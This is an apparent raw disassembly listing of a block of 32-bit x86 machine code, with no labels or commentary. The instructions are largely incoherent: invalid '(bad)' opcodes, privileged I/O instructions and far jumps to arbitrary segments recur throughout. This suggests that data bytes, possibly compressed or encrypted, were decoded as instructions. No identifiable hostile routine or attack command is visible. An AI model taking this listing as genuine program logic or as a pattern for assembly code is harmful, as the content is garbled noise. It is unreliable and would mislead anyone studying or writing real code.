  40980a:	cmp    bh,BYTE PTR [eax-0x42]
  40980d:	xlat   BYTE PTR ds:[ebx]
  40980e:	loopne 0x409852
  409810:	enter  0x46ce,0xc1
  409814:	pusha  
  409815:	sbb    DWORD PTR [edi+0x23f75114],esp
  40981b:	mov    ebp,0xcfb0cdac
  409820:	push   ecx
  409821:	mov    WORD PTR ds:0x245cf744,?
  409827:	cmc    
  409828:	aas    
  409829:	ins    BYTE PTR es:[edi],dx
  40982a:	inc    edi
  40982b:	xchg   ecx,eax
  40982c:	mov    eax,ebp
  40982e:	retf   
  40982f:	in     al,dx
  409830:	stos   BYTE PTR es:[edi],al
  409831:	test   ebx,ebx
  409833:	cli    
  409834:	jg     0x40981e
  409836:	push   ebp
  409837:	jno    0x4097fe
  409839:	add    al,0xc2
  40983b:	data16 int3 
  40983d:	je     0x4098b2
  40983f:	cmp    eax,0xb9f018d1
  409844:	aam    0xd2
  409846:	dec    ebp
  409847:	jne    0x4097d9
  409849:	push   esp
  40984a:	adc    DWORD PTR [ecx],0xf078811
  409850:	sub    al,0x69
  409852:	ins    BYTE PTR es:[edi],dx
  409853:	mov    bl,0x44
  409855:	repz sub edx,DWORD PTR [edx]
  409858:	mov    al,ch
  40985a:	fcom   DWORD PTR [ecx-0x58]
  40985d:	shl    BYTE PTR [ebp-0x46b68cd5],cl
  409863:	and    eax,0x6e087db1
  409868:	hlt    
  409869:	or     eax,0x4c0ce42b
  40986e:	fnstenv [ebx]
  409870:	test   DWORD PTR [ebp-0x34],0xd07eb9ae
  409877:	cmp    cl,BYTE PTR [ebx+0x212cf320]
  40987d:	xor    BYTE PTR [ebp+0x88fc733],dl
  409883:	(bad)  
  409884:	jne    0x409878
  409886:	cmp    eax,0x8d014643
  40988b:	shr    BYTE PTR [eax+0xb],0xec
  40988f:	jmp    0x409893
  409891:	sahf   
  409892:	nop
  409893:	mov    BYTE PTR [ebx+0x52],bh
  409896:	push   ebp
  409897:	ins    DWORD PTR es:[edi],dx
  409898:	push   ss
  409899:	add    dh,BYTE PTR [edi+0x7a]
  40989c:	shl    DWORD PTR [eax-0x21b26ecd],0x53
  4098a3:	mov    edi,DWORD PTR [ecx+0x7d]
  4098a6:	loopne 0x40982e
  4098a8:	jno    0x4098de
  4098aa:	add    al,0xff
  4098ac:	mov    ds:0xa74d0adb,al
  4098b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b2:	fisttp DWORD PTR [ecx]
  4098b4:	rcr    BYTE PTR [ecx+ecx*8-0x4f701745],0x8e
  4098bc:	retf   0xe2e4
  4098bf:	mov    WORD PTR [ecx-0x50],es
  4098c2:	sub    eax,0x4d7cf264
  4098c7:	retf   0xd0df
  4098ca:	cmp    edx,DWORD PTR [edx]
  4098cc:	sbb    esi,DWORD PTR [eax]
  4098ce:	hlt    
  4098cf:	lds    ebp,FWORD PTR [eax]
  4098d1:	cmc    
  4098d2:	popa   
  4098d3:	std    
  4098d4:	jg     0x409943
  4098d6:	test   al,0xb2
  4098d8:	cmp    esp,DWORD PTR [esp+eax*8-0xab59128]
  4098df:	jae    0x4098fd
  4098e1:	push   ds
  4098e2:	je     0x409947
  4098e4:	push   ecx
  4098e5:	test   al,0xff
  4098e7:	sbb    BYTE PTR [esi-0x58],ch
  4098ea:	jge    0x409932
  4098ec:	sbb    esi,DWORD PTR [edx+ebx*4+0x584fde4f]
  4098f3:	mov    bh,0x82
  4098f5:	in     al,dx
  4098f6:	mov    cl,0xec
  4098f8:	fsub   st,st(0)
  4098fa:	cmp    bh,ch
  4098fc:	jge    0x409919
  4098fe:	icebp  
  4098ff:	xchg   esp,eax
  409900:	sbb    edx,ebx
  409902:	jge    0x40997c
  409904:	jle    0x409902
  409906:	jae    0x409969
  409908:	aas    
  409909:	ss mov bh,0xb6
  40990c:	retf   0xaec
  40990f:	push   esi
  409910:	inc    edx
  409911:	xor    al,0x4f
  409913:	mov    esp,0xde7c3184
  409918:	inc    esp
  409919:	sub    bh,BYTE PTR [ebp+0x6f5a8499]
  40991f:	xchg   DWORD PTR [edx-0x8],ebx
  409922:	lock push 0x34
  409925:	ds (bad) 
  409928:	inc    esp
  409929:	dec    edx
  40992a:	imul   eax,ebx,0x2303f688
  409930:	mov    dl,0x1d
  409932:	add    eax,0x72ab4507
  409937:	mov    ch,0xdc
  409939:	ret    
  40993a:	stos   BYTE PTR es:[edi],al
  40993b:	sbb    al,0xd9
  40993d:	aam    0xc7
  40993f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409940:	cdq    
  409941:	lds    ebp,FWORD PTR [esi+eax*2+0x3d63a0af]
  409948:	sub    al,0xee
  40994a:	or     al,0xb9
  40994c:	jo     0x4099a0
  40994e:	ja     0x409991
  409950:	sbb    ebp,DWORD PTR [edi]
  409952:	pusha  
  409953:	push   ebp
  409954:	sti    
  409955:	gs lahf 
  409957:	ret    
  409958:	imul   DWORD PTR [ecx]
  40995a:	ret    
  40995b:	aam    0x82
  40995d:	mul    DWORD PTR [ebx+esi*8+0x41589cc2]
  409964:	scas   eax,DWORD PTR es:[edi]
  409965:	xchg   esi,eax
  409966:	jnp    0x4099d5
  409968:	stc    
  409969:	pop    ss
  40996a:	std    
  40996b:	and    bh,BYTE PTR [edi-0x8]
  40996e:	and    ch,dh
  409970:	inc    esi
  409971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409972:	ror    BYTE PTR [edx+0x49eb5bf2],cl
  409978:	test   eax,0x8dd2f1b
  40997d:	or     DWORD PTR [ebp+0x6e],ebx
  409980:	inc    edx
  409981:	shl    DWORD PTR [esi+0x5f4d1bd1],cl
  409987:	mov    eax,0x5860858a
  40998c:	test   DWORD PTR [ebx],edx
  40998e:	push   DWORD PTR [eax]
  409990:	lods   al,BYTE PTR ds:[esi]
  409991:	or     eax,0x84811599
  409996:	pop    ecx
  409997:	dec    esi
  409998:	dec    esp
  409999:	mov    cs,WORD PTR [edi-0xb]
  40999c:	pop    eax
  40999d:	or     al,cl
  40999f:	cdq    
  4099a0:	fst    DWORD PTR [ebx+0x7f8fd967]
  4099a6:	iret   
  4099a7:	jns    0x409a27
  4099a9:	push   esp
  4099aa:	aam    0x64
  4099ac:	push   esi
  4099ad:	shl    BYTE PTR [edi],cl
  4099af:	jmp    0x9fe4:0x53283beb
  4099b6:	neg    DWORD PTR [ebx+0x44]
  4099b9:	in     eax,0xdc
  4099bb:	out    dx,eax
  4099bc:	je     0x40999d
  4099be:	lods   eax,DWORD PTR ds:[esi]
  4099bf:	in     eax,0x33
  4099c1:	jecxz  0x409a08
  4099c3:	popa   
  4099c4:	push   es
  4099c5:	ss xchg ebp,eax
  4099c7:	or     ebx,edx
  4099c9:	xchg   edx,eax
  4099ca:	cmp    DWORD PTR [ebx],esp
  4099cc:	call   0x87b:0x90f8889b
  4099d3:	mov    ch,0x96
  4099d5:	mov    al,ds:0xe30fe0fc
  4099da:	mov    BYTE PTR [edi-0x77],ah
  4099dd:	sub    ch,BYTE PTR [esi+0x2bdb08e1]
  4099e3:	out    0x73,al
  4099e5:	dec    esi
  4099e6:	mov    WORD PTR [edi-0x3836f9f1],es
  4099ec:	sub    DWORD PTR [esi+ecx*8+0x3f88dec7],eax
  4099f3:	fcom   DWORD PTR [ecx]
  4099f5:	push   ss
  4099f6:	sbb    BYTE PTR [ebp-0x45],bh
  4099f9:	in     eax,dx
  4099fa:	addr16 push ss
  4099fc:	dec    edi
  4099fd:	enter  0x9f60,0xec
  409a01:	jmp    0xa8b0:0x2b4c0851
  409a08:	ja     0x409a31
  409a0a:	ins    DWORD PTR es:[edi],dx
  409a0b:	push   ecx
  409a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a0d:	cmp    edx,edi
  409a0f:	test   DWORD PTR [ecx],ebp
  409a11:	mov    esp,DWORD PTR [ebx]
  409a13:	jmp    0x409a35
  409a15:	pop    ds
  409a16:	mov    edx,0x182c350b
  409a1b:	lea    ebx,[edx]
  409a1d:	mov    esp,0x758eea62
  409a22:	sahf   
  409a23:	clc    
  409a24:	fimul  WORD PTR [ebx]
  409a26:	(bad)  
  409a27:	cdq    
  409a28:	mov    ebp,0x93d8bf59
  409a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2e:	sbb    bh,al
  409a30:	test   al,0xfa
  409a32:	pop    ecx
  409a33:	cmc    
  409a34:	xchg   ebp,eax
  409a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a36:	inc    ebx
  409a37:	retf   
  409a38:	call   0x825b:0xe40ceb71
  409a3f:	fcomip st,st(0)
  409a41:	jecxz  0x409a53
  409a43:	sub    cl,BYTE PTR [ebp-0x4ea99237]
  409a49:	jl     0x409a21
  409a4b:	and    eax,0x499baa95
  409a50:	(bad)  [eax+0x61]
  409a53:	mov    edi,0xa304c552
  409a58:	adc    al,0x34
  409a5a:	arpl   WORD PTR [ebp-0x31bf1159],bp
  409a60:	jge    0x409a03
  409a62:	(bad)  
  409a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a64:	pop    es
  409a65:	mov    ds:0xb15346d6,al
  409a6a:	inc    edi
  409a6b:	xchg   edi,eax
  409a6c:	ja     0x409a1e
  409a6e:	sub    edi,ebp
  409a70:	stos   DWORD PTR es:[edi],eax
  409a71:	sub    DWORD PTR [esp+ebp*8],0x75
  409a75:	add    edi,DWORD PTR ds:0x9ba98468
  409a7b:	mov    ch,0x4b
  409a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a7e:	mov    esi,0x5a27d1e1
  409a83:	outs   dx,DWORD PTR ds:[esi]
  409a84:	retf   0xedbe
  409a87:	retf   0x54d7
  409a8a:	mul    edx
  409a8c:	dec    esi
  409a8d:	xchg   ebx,eax
  409a8e:	adc    eax,0x34048f12
  409a93:	outs   dx,BYTE PTR ds:[esi]
  409a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a95:	xor    bh,ch
  409a97:	ss add eax,0xa13f50a3
  409a9d:	hlt    
  409a9e:	sti    
  409a9f:	or     ah,ch
  409aa1:	inc    esp
  409aa2:	sar    ebx,0x8b
  409aa5:	in     al,0x7
  409aa7:	lea    edi,[eax]
  409aa9:	sub    al,0xc5
  409aab:	jl     0x409ace
  409aad:	(bad)  
  409aae:	stc    
  409aaf:	inc    edi
  409ab0:	mov    esi,0xaa0f7ab3
  409ab5:	in     eax,0x27
  409ab7:	lds    ebp,FWORD PTR [ebx]
  409ab9:	dec    esp
  409aba:	shl    DWORD PTR [ebx+0x3e6f8c9d],1
  409ac0:	push   0x5412fbb4
  409ac5:	nop
  409ac6:	dec    esi
  409ac7:	xor    DWORD PTR [edi-0x5],ebp
  409aca:	lods   eax,DWORD PTR ds:[esi]
  409acb:	add    edi,ebx
  409acd:	push   ebp
  409ace:	lea    ebx,[esi+0x1f55dca2]
  409ad4:	mov    ebx,ebp
  409ad6:	popf   
  409ad7:	jae    0x409ac3
  409ad9:	dec    ecx
  409ada:	jb     0x409adc
  409adc:	and    DWORD PTR [esi+0x37],ebx
  409adf:	sbb    eax,0x43a43c5f
  409ae4:	aas    
  409ae5:	icebp  
  409ae6:	mov    ds:0x287fef57,al
  409aeb:	ds iret 
  409aed:	xchg   ecx,eax
  409aee:	fsub   QWORD PTR [ebp-0x20]
  409af1:	inc    edi
  409af2:	out    dx,al
  409af3:	rcr    dh,0xe2
  409af6:	mov    dh,0x40
  409af8:	not    edx
  409afa:	cmp    eax,0xa10a76e5
  409aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b00:	outs   dx,DWORD PTR ds:[esi]
  409b01:	push   es
  409b02:	push   es
  409b03:	shl    DWORD PTR [edi+0x27722473],1
  409b09:	xchg   esp,eax
  409b0a:	inc    bp
  409b0c:	aad    0x28
  409b0e:	scas   al,BYTE PTR es:[edi]
  409b0f:	mov    al,0x37
  409b11:	sub    DWORD PTR [ecx-0x75782fce],eax
  409b17:	mov    ecx,0xacf205cd
  409b1c:	(bad)  
  409b1d:	iret   
  409b1e:	iret   
  409b1f:	push   esi
  409b20:	sbb    eax,0xe932be5b
  409b25:	adc    eax,0xcdca074e
  409b2a:	outs   dx,BYTE PTR ds:[esi]
  409b2b:	sysenter 
  409b2d:	cmc    
  409b2e:	jl     0x409b10
  409b30:	lds    edi,FWORD PTR [ebp+edi*4-0x714af736]
  409b37:	mov    ch,0x96
  409b39:	mov    dh,0x56
  409b3b:	jg     0x409b41
  409b3d:	xchg   ecx,eax
  409b3e:	jp     0x409b37
  409b40:	push   ss
  409b41:	push   esi
  409b42:	push   esi
  409b43:	jle    0x409b75
  409b45:	aas    
  409b46:	mov    ah,0x62
  409b48:	push   edi
  409b49:	and    bl,BYTE PTR [edi-0x3]
  409b4c:	test   eax,0xdb045af6
  409b51:	mov    esp,es
  409b53:	iret   
  409b54:	xchg   ebp,eax
  409b55:	or     DWORD PTR [eax-0x8],0xe56399f7
  409b5c:	mov    ebp,0x42b83b5e
  409b61:	test   al,0x3b
  409b63:	cmp    al,0x10
  409b65:	enter  0x9974,0x6e
  409b69:	or     al,0x67
  409b6b:	push   ds
  409b6c:	mov    eax,ds:0x1905c3bb
  409b71:	mov    ds,eax
  409b73:	push   edi
  409b74:	out    0x5f,al
  409b76:	rcr    BYTE PTR [ebx-0x77],cl
  409b79:	pop    esp
  409b7a:	add    BYTE PTR [ebx-0xd],0xac
  409b7e:	push   es
  409b7f:	inc    esp
  409b80:	fisttp DWORD PTR [ecx]
  409b82:	xchg   DWORD PTR [eax+0x72592f02],edx
  409b88:	mov    WORD PTR [edi+ebp*4+0x7e],?
  409b8c:	gs mov bh,0x16
  409b8f:	lea    ebx,[esi+0x1b38c363]
  409b95:	add    eax,DWORD PTR [ebp-0x1581791]
  409b9b:	cmp    BYTE PTR [ecx-0x7076fb75],al
  409ba1:	jne    0x409be8
  409ba3:	ja     0x409b8f
  409ba5:	xchg   ebp,eax
  409ba6:	shl    DWORD PTR [eax],cl
  409ba8:	out    dx,al
  409ba9:	outs   dx,DWORD PTR ds:[esi]
  409baa:	neg    BYTE PTR [eax-0x53c3c981]
  409bb0:	ins    BYTE PTR es:[edi],dx
  409bb1:	or     esp,0x12
  409bb4:	int    0x3c
  409bb6:	ins    BYTE PTR es:[edi],dx
  409bb7:	xchg   ebx,eax
  409bb8:	and    ebp,DWORD PTR [ebx-0x1a]
  409bbb:	fsubr  DWORD PTR [edi-0x3068c4c0]
  409bc1:	jle    0x409b9c
  409bc3:	je     0x409bc1
  409bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc6:	std    
  409bc7:	pop    edi
  409bc8:	mov    ds:0xcd38db22,eax
  409bcd:	mov    al,ds:0x56c36c8c
  409bd2:	cmc    
  409bd3:	loop   0x409b79
  409bd5:	and    BYTE PTR [ecx+0x2c89c237],cl
  409bdb:	xor    al,0x7a
  409bdd:	fild   QWORD PTR [ebp+0x36]
  409be0:	cld    
  409be1:	mov    ds:0xf28e3c08,eax
  409be6:	mov    ds:0x2a625b35,eax
  409beb:	push   ds
  409bec:	and    al,0x7d
  409bee:	popf   
  409bef:	sub    al,ah
  409bf1:	mov    eax,0xfac05dfb
  409bf6:	ffreep st(5)
  409bf8:	retf   0x18a4
  409bfb:	inc    esi
  409bfc:	inc    ebp
  409bfd:	or     al,0x24
  409bff:	push   edi
  409c00:	(bad)  
  409c01:	mov    edx,0x77431db3
  409c06:	mov    esp,0x79019708
  409c0b:	scas   eax,DWORD PTR es:[edi]
  409c0c:	pop    esp
  409c0d:	add    DWORD PTR [edi],eax
  409c0f:	inc    eax
  409c10:	add    eax,0x89f65b5c
  409c15:	jge    0x409c8d
  409c17:	lea    edi,[eax+0x1]
  409c1a:	mov    eax,DWORD PTR ds:0xb0a4452f
  409c20:	rcr    DWORD PTR [edx-0x1be074f2],1
  409c26:	dec    ebp
  409c27:	call   0xe999:0x84b41c65
  409c2e:	jecxz  0x409c27
  409c30:	ins    BYTE PTR es:[edi],dx
  409c31:	pop    ss
  409c32:	mov    al,ds:0xb0f1d0a7
  409c37:	test   BYTE PTR [ecx],bl
  409c39:	mov    al,0x48
  409c3b:	pop    ds
  409c3c:	jmp    0xc0ec:0x11533122
  409c43:	call   DWORD PTR [esi+0x12223c4b]
  409c49:	jnp    0x409cb9
  409c4b:	inc    edx
  409c4c:	and    BYTE PTR [ebx+0x37],dl
  409c4f:	pop    eax
  409c50:	aad    0xed
  409c52:	mov    ds:0x62faeb69,eax
  409c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c58:	(bad)  
  409c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c5a:	(bad)  
  409c5b:	jnp    0x409cb9
  409c5d:	rcr    dl,0x57
  409c60:	adc    dh,BYTE PTR [ebx+0x10]
  409c63:	scas   eax,DWORD PTR es:[edi]
  409c64:	mov    ch,0xc1
  409c66:	fsubr  QWORD PTR [eax+0x64]
  409c69:	push   ebx
  409c6a:	sahf   
  409c6b:	(bad)  
  409c6c:	je     0x409c55
  409c6e:	xchg   esi,eax
  409c6f:	xor    al,BYTE PTR [esi-0x428431d3]
  409c75:	pop    edi
  409c76:	inc    edx
  409c77:	jnp    0x409c9c
  409c79:	stos   BYTE PTR es:[edi],al
  409c7a:	inc    DWORD PTR [ecx+0x7d]
  409c7d:	sbb    edx,DWORD PTR [esi-0x13]
  409c80:	xlat   BYTE PTR ds:[ebx]
  409c81:	pusha  
  409c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c83:	or     BYTE PTR [ecx],bh
  409c85:	xor    al,0x20
  409c87:	js     0x409cad
  409c89:	xchg   esi,eax
  409c8a:	sub    DWORD PTR [edi],0xd3b6c91d
  409c90:	mov    ch,0xcf
  409c92:	push   eax
  409c93:	jno    0x409ce4
  409c95:	mov    dh,0xfa
  409c97:	fcomp  DWORD PTR [edx+ebx*1-0x1b]
  409c9b:	in     eax,dx
  409c9c:	jge    0x409c72
  409c9e:	cld    
  409c9f:	mov    al,0x9a
  409ca1:	adc    BYTE PTR [esi-0x68],ah
  409ca4:	push   cs
  409ca5:	push   eax
  409ca6:	sbb    dh,BYTE PTR [esi-0x76]
  409ca9:	sbb    ebx,0x3f424fd2
  409caf:	pop    esp
  409cb0:	int3   
  409cb1:	mov    ch,0xd
  409cb3:	aad    0xbd
  409cb5:	or     al,0x86
  409cb7:	loope  0x409d38
  409cb9:	fcmovbe st,st(1)
  409cbb:	nop
  409cbc:	loopne 0x409c8a
  409cbe:	lds    esp,FWORD PTR [ebp+0x33]
  409cc1:	dec    edx
  409cc2:	(bad)  
  409cc3:	out    0xa9,al
  409cc5:	jmp    0x79ae:0x2637a312
  409ccc:	sbb    dl,cl
  409cce:	fwait
  409ccf:	sub    eax,0xee29f9bf
  409cd4:	adc    bl,dl
  409cd6:	(bad)  
  409cd7:	adc    ecx,DWORD PTR [ebx+ecx*2+0x1]
  409cdb:	add    edx,ecx
  409cdd:	fmulp  st(7),st
  409cdf:	adc    al,0x57
  409ce1:	rcl    edi,1
  409ce3:	push   ebx
  409ce4:	(bad)  
  409ce5:	xchg   esp,eax
  409ce6:	hlt    
  409ce7:	lahf   
  409ce8:	cmp    bl,ch
  409cea:	(bad)  [edi+0x2d]
  409ced:	push   0x98e5d355
  409cf2:	icebp  
  409cf3:	jb     0x409d6c
  409cf5:	std    
  409cf6:	outs   dx,BYTE PTR ds:[esi]
  409cf7:	loope  0x409cd5
  409cf9:	fild   QWORD PTR [esi]
  409cfb:	sbb    DWORD PTR [ebp+edx*8-0x74],ecx
  409cff:	mov    ds:0x1065d8ff,al
  409d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d05:	inc    ecx
  409d06:	and    cl,BYTE PTR [esi+edx*1-0x7f17cd58]
  409d0d:	into   
  409d0e:	pop    ds
  409d0f:	ss or  eax,0x537ece74
  409d15:	jl     0x409cfc
  409d17:	push   ds
  409d18:	add    esi,edx
  409d1a:	inc    edx
  409d1b:	les    ebx,FWORD PTR [edi]
  409d1d:	sbb    bh,BYTE PTR [ecx]
  409d1f:	pusha  
  409d20:	loope  0x409d91
  409d22:	xchg   esp,eax
  409d23:	fbstp  TBYTE PTR [ebx+0x4e]
  409d26:	ror    bh,cl
  409d28:	mov    al,0x31
  409d2a:	add    eax,0x519ede60
  409d2f:	test   DWORD PTR [eax+0x63a7508],0x51c3921a
  409d39:	sub    DWORD PTR [esi+0x4c],0x1a6f08f7
  409d40:	imul   ebp,DWORD PTR [ebp+0x5f8980f4],0x75
  409d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d48:	jmp    0x60dd9321
  409d4d:	lods   eax,DWORD PTR ds:[esi]
  409d4e:	mov    esi,0xf3368b0f
  409d53:	(bad)  
  409d54:	jb     0x409db3
  409d56:	scas   al,BYTE PTR es:[edi]
  409d57:	pop    edx
  409d58:	aas    
  409d59:	neg    DWORD PTR [esi+0x2c]
  409d5c:	push   ss
  409d5d:	push   0x11e41285
  409d62:	add    DWORD PTR [edx-0x23],ebp
  409d65:	adc    eax,0x9a1b9aa1
  409d6a:	test   BYTE PTR fs:[ebp-0x7d],0x3a
  409d6f:	cmp    bl,bh
  409d71:	dec    esp
  409d72:	mov    cs,WORD PTR [eax+0x32426819]
  409d78:	das    
  409d79:	fwait
  409d7a:	jne    0x409d26
  409d7c:	shr    BYTE PTR [ecx-0x59],1
  409d7f:	and    DWORD PTR ds:0xa1b21e99,edx
  409d85:	pop    edx
  409d86:	mov    edi,0x6defbb12
  409d8b:	leave  
  409d8c:	call   0x4ae42ad3
  409d91:	ja     0x409d50
  409d93:	fcom   DWORD PTR [eax+0x31]
  409d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d97:	mov    bl,0xec
  409d99:	fs mov al,0x3e
  409d9c:	idiv   DWORD PTR [ebx]
  409d9e:	sub    al,BYTE PTR [ecx]
  409da0:	mov    bh,0x5f
  409da2:	lds    ecx,FWORD PTR [edi]
  409da4:	inc    esp
  409da5:	(bad)  
  409da6:	iret   
  409da7:	jo     0x409d6f
  409da9:	inc    ecx
  409daa:	test   ecx,0x863c2db1
  409db0:	ret    0x3163
  409db3:	in     al,0x7a
  409db5:	adc    dh,BYTE PTR [ecx]
  409db7:	outs   dx,BYTE PTR ds:[esi]
  409db8:	xchg   DWORD PTR [esp+eax*2-0x3c],ebx
  409dbc:	shl    DWORD PTR [ebx+0x433a3b7d],cl
  409dc2:	inc    eax
  409dc3:	add    ebp,DWORD PTR [ecx]
  409dc5:	dec    ebx
  409dc6:	aad    0x9b
  409dc8:	and    bl,BYTE PTR [edx-0x7b]
  409dcb:	push   ecx
  409dcc:	cmc    
  409dcd:	inc    ebx
  409dce:	and    DWORD PTR [ecx+0x32],edx
  409dd1:	xor    al,0xb2
  409dd3:	inc    eax
  409dd4:	inc    esp
  409dd5:	xor    eax,0x43085b25
  409dda:	sub    al,0x4e
  409ddc:	cmp    al,0xcf
  409dde:	and    DWORD PTR [esi],0x3588a61e
  409de4:	xchg   BYTE PTR [ecx+0x6a768521],al
  409dea:	fcom   QWORD PTR [ebp+edx*8-0x4e]
  409dee:	call   0x3f8f:0xdb0aac1b
  409df5:	add    dh,al
  409df7:	mov    edi,0x1ed8e532
  409dfc:	rcr    DWORD PTR [edi*4+0x6afd0532],cl
  409e03:	enter  0xdd55,0xf5
  409e07:	pop    ds
  409e08:	sti    
  409e09:	jmp    0x409db3
  409e0b:	mov    ch,dh
  409e0d:	ret    
  409e0e:	push   esp
  409e0f:	push   es
  409e10:	xchg   edx,eax
  409e11:	pop    eax
  409e12:	jnp    0x409e1f
  409e14:	sbb    DWORD PTR [eax],0x2b
  409e17:	scas   al,BYTE PTR es:[edi]
  409e18:	or     BYTE PTR [eax],ah
  409e1a:	lahf   
  409e1b:	retf   
  409e1c:	jns    0x409e08
  409e1e:	sub    BYTE PTR [ecx],bl
  409e20:	mov    edi,0xa9508f45
  409e25:	adc    eax,0xd926fd8f
  409e2a:	iret   
  409e2b:	mov    eax,ds:0xd97e872
  409e30:	mov    esp,0xc401419e
  409e35:	jp     0x409e5e
  409e37:	(bad)  
  409e38:	ds addr16 jg 0x409e39
  409e3c:	mov    ds:0x900f8b8c,eax
  409e41:	mov    al,BYTE PTR [esi+0x64370b1c]
  409e47:	lea    ecx,[esi-0x75dce0c9]
  409e4d:	or     bl,BYTE PTR [ebx-0x1a]
  409e50:	popf   
  409e51:	ss pop ecx
  409e53:	sub    al,0x20
  409e55:	and    BYTE PTR [ecx],ah
  409e57:	(bad)
  409e5c:	stc    
  409e5d:	jle    0x409e3c
  409e5f:	sti    
  409e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e61:	clc    
  409e62:	mov    cl,BYTE PTR [esi-0x51]
  409e65:	retf   0x1a91
  409e68:	mov    esi,0x28e935fe
  409e6d:	outs   dx,DWORD PTR ds:[esi]
  409e6e:	xor    esp,DWORD PTR [edx-0x5b]
  409e71:	sbb    ebp,DWORD PTR [edx]
  409e73:	pop    ss
  409e74:	xchg   ebp,eax
  409e75:	test   DWORD PTR [esi],eax
  409e77:	std    
  409e78:	xor    BYTE PTR [ebx],ch
  409e7a:	int    0x9f
  409e7c:	test   eax,0x241e0e58
  409e81:	cmp    al,BYTE PTR [edi+0x493fa5e7]
  409e87:	pop    esi
  409e88:	jmp    0xe2aab6e7
  409e8d:	call   0xee79:0x37402f59
  409e94:	xlat   BYTE PTR ds:[ebx]
  409e95:	clc    
  409e96:	mov    esi,0xf58ee917
  409e9b:	scas   al,BYTE PTR es:[edi]
  409e9c:	clc    
  409e9d:	xor    bh,BYTE PTR [esi+0x6e]
  409ea0:	aaa    
  409ea1:	ror    DWORD PTR [edi],cl
  409ea3:	clc    
  409ea4:	pop    esi
  409ea5:	outs   dx,BYTE PTR ds:[esi]
  409ea6:	out    0xd,eax
  409ea8:	cmp    al,0xaf
  409eaa:	xchg   esp,eax
  409eab:	xor    al,0x5b
  409ead:	mov    edx,0xb8f3b0a1
  409eb2:	nop
  409eb3:	mov    edi,0x55c38d26
  409eb8:	add    eax,0x6b992298
  409ebd:	sub    dh,BYTE PTR [eax+0x5c]
  409ec0:	(bad)  
  409ec1:	imul   ebx,esp,0xffffffac
  409ec4:	inc    ebp
  409ec5:	lods   eax,DWORD PTR ds:[esi]
  409ec6:	fild   QWORD PTR ds:0xd5a53f2
  409ecc:	add    edi,DWORD PTR ds:0xb37d01cb
  409ed2:	push   edi
  409ed3:	ss loopne 0x409e5e
  409ed6:	daa    
  409ed7:	cs dec esp
  409ed9:	jle    0x409e6a
  409edb:	add    DWORD PTR [ebx+0x1e],edx
  409ede:	popf   
  409edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ee0:	int3   
  409ee1:	loopne 0x409e6a
  409ee3:	in     eax,0x29
  409ee5:	mov    cs,ecx
  409ee7:	rcr    ebx,cl
  409ee9:	sub    BYTE PTR [ebx],al
  409eeb:	adc    esi,0x3aaa079
  409ef1:	pushf  
  409ef2:	ret    
  409ef3:	outs   dx,DWORD PTR ds:[esi]
  409ef4:	sub    eax,esi
  409ef6:	and    esi,DWORD PTR ds:0x931d584c
  409efc:	aas    
  409efd:	shl    DWORD PTR [ebp-0x4f7e1c72],0xa
  409f04:	push   0xffffffc8
  409f06:	and    esi,esi
  409f08:	aad    0x93
  409f0a:	mov    bh,0x38
  409f0c:	enter  0xae95,0xc3
  409f10:	pop    edi
  409f11:	mov    esp,0x18d569d7
  409f16:	add    BYTE PTR ds:0xdc66ec5c,dh
  409f1c:	mov    ebx,0x42c5fc12
  409f21:	adc    eax,0x577f8d11
  409f26:	add    DWORD PTR [esi-0x16],ebp
  409f29:	adc    ch,BYTE PTR [ebx+0x6cf4b9bd]
  409f2f:	cmp    al,0xfb
  409f31:	adc    eax,0xabb5874f
  409f36:	mov    ds:0xca0cafc5,eax
  409f3b:	xor    cl,BYTE PTR [eax+0xa7343c3]
  409f41:	mov    eax,0x8c72c9b8
  409f46:	pop    ss
  409f47:	repz mov esp,0x7020fa34
  409f4d:	lock push 0xe6ebdf5f
  409f53:	xchg   BYTE PTR [ecx],dl
  409f55:	test   DWORD PTR [edx-0x39],edx
  409f58:	pop    ebx
  409f59:	add    edi,ebp
  409f5b:	cdq    
  409f5c:	je     0x409f92
  409f5e:	les    esi,FWORD PTR [edx+ebp*2]
  409f61:	sub    edi,DWORD PTR es:[edx]
  409f64:	fdivp  st(0),st
  409f66:	aam    0x4e
  409f68:	int    0xa0
  409f6a:	pop    ds
  409f6b:	push   eax
  409f6c:	mov    WORD PTR [eax+0x17],es
  409f6f:	fsub   DWORD PTR [eax-0x6a]
  409f72:	dec    BYTE PTR [esi]
  409f74:	xor    esi,ecx
  409f76:	js     0x409fd7
  409f78:	(bad)  
  409f79:	ins    DWORD PTR es:[edi],dx
  409f7a:	scas   ax,WORD PTR es:[edi]
  409f7c:	fisubr DWORD PTR [edi+0x35]
  409f7f:	adc    edi,DWORD PTR [ebp+0x6165a232]
  409f85:	test   eax,0xa82e05a1
  409f8a:	into   
  409f8b:	pop    ds
  409f8c:	push   ds
  409f8d:	pop    ss
  409f8e:	ds xor eax,0xb29e896c
  409f94:	xchg   esi,eax
  409f95:	xchg   cx,ax
  409f97:	dec    edx
  409f98:	into   
  409f99:	pop    edx
  409f9a:	and    BYTE PTR [ecx],al
  409f9c:	cs sub esp,ecx
  409f9f:	test   al,0x38
  409fa1:	cmp    DWORD PTR [edi-0x72],eax
  409fa4:	or     eax,0x4ad57580
  409fa9:	outs   dx,BYTE PTR ds:[esi]
  409faa:	sub    dl,cl
